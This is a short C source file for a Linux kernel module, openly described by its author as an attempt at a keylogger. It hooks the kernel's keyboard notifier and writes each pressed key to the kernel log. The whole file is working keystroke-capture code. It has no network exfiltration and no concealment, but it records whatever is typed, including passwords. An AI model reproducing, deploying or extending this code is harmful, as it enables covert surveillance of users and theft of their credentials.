#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/uaccess.h>
#include <linux/notifier.h>

MODULE_AUTHOR("Chags");
MODULE_DESCRIPTION("Trying to make a keylogger");
MODULE_LICENSE("GPL");

int triggered(struct notifier_block *nb, unsigned long action, void *data)
{
		struct keyboard_notifier_param *param = data;
		if (action == KBD_KEYSYM && param->down) {
		char c = param->value;
        printk("Entering into %s, and key was pressed and data was %c \n", __func__,c);   
    	}
        return 0;
}

struct notifier_block notifierblock = {
        .notifier_call = triggered,
};

int starting_module(void)
{
    int i;
    printk("Entering into %s \n", __func__);    
    
    i=register_keyboard_notifier(&notifierblock);
    printk(KERN_INFO "Register key board notifier returned with %d\n",i);

    return i;
}

void ending_module(void)
{
    printk("Entering into %s \n", __func__);
    unregister_keyboard_notifier(&notifierblock);
}

module_init(starting_module);
module_exit(ending_module);